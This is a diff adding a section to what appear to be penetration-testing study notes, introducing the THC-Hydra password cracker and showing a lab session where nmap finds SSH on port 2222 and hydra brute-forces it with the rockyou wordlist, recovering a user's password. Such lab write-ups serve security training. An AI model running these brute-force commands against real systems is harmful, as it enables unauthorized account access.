@@ -3121,4 +3121,27 @@ client01\CHW
 
 # Password Attacks
 ## Attacking Network Services Logins
-### 1. SSH and RDP logins
+### 1. SSH and RDP logins (hydra)
+[Hydra（THC-Hydra）](https://github.com/vanhauser-thc/thc-hydra)是一款網路密碼破解工具，支援多的協議，例如：HTTP/HTTPS, FTP, SSH, RDP, Telnet, MySQL, PostgreSQL, MSSQL, SMTP, POP3, IMAP ..etc\
+![image](https://hackmd.io/_uploads/ByKbqwcDJl.png)
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo nmap -sV -p 2222 192.168.50.201
+...
+PORT   STATE SERVICE
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+...
+┌──(chw㉿CHW)-[~]
+└─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+...
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.50.201:22/
+[2222][ssh] host: 192.168.50.201   login: george   password: chocolate
+1 of 1 target successfully completed, 1 valid password found
+...
+```
+- password spraying
+
+
+### 2. HTTP POST login forms
